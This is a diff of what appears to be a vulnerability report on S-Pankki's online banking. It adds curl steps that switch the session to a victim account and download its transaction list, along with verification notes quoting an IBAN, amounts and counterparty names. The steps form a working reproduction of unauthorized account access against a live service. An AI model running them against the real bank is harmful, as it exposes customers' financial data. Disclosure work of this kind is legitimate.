@@ -66,13 +66,22 @@ Extract the IBAN from `matrix.pdf`: it contains **FI74 3939 0001 0006 11** (ACC2
 
 ```bash
 # set context to ACC2, then fetch the (parameterless) transaction list
-curl -s -b $JAR -A "$UA" "https://online.s-pankki.fi/ebank/account/showAccountDetails.do?accountId=${ACC_VICTIM}" -o ctx2.html
+# NOTE: use the accountview/ variant (the link the front page itself uses) —
+# the account/ variant intermittently kills the session (1361 B "yhteys on suljettu"
+# + JSESSIONID Max-Age=0); see the companion session-kill finding.
+curl -s -b $JAR -A "$UA" "https://online.s-pankki.fi/ebank/accountview/showAccountDetails.do?accountId=${ACC_VICTIM}&back=mybank" -o ctx2.html
 curl -s -b $JAR -A "$UA" "https://online.s-pankki.fi/ebank/account/fetchTransactionList.do" -o txlist_acc2.html
 
-wc -c txlist_acc2.html   # ~81 KB of ACC2 data (transactions, balances, history)
+wc -c txlist_acc2.html   # ~81 KB of ACC2 data (15 non-zero transactions, counterparty names)
 grep -o 'FI74' txlist_acc2.html | head -1
-# compare with ACC1 context: ~75 KB page containing FI96
+# compare with ACC1 context: ~75 KB page with a different set of 9 non-zero transactions
 ```
+
+Notes (verified 2026-10-14):
+
+- The page carries **real non-zero amounts + counterparty names** (e.g. `9.10.2026 −500,00 OMA TILISIIRTO MAIJA MEIKÄINEN`, `+105,45 LAPSILISÄ KELA`). The two accounts' pages differ in size (75,316 B vs 81,368 B), md5 and row set — see `evidence/17/18/21`.
+- `fetchTransactionList.do?accountId=<A>&tab=tab1` — the direct `accountId` param is **ignored**: the response is byte-identical (same md5) to the last session-context account's page. The context (set in step 3a/4), not the param, drives the data.
+- The official **fees PDF shows 0,00** because it is a *fee statement* (no fee package on the demo account) — the non-zero money is on the pages above; see `evidence/21_nontzero_proof_summary.md`.
 
 ## Step 5 — CSV transaction export (second downloadable artifact)
 
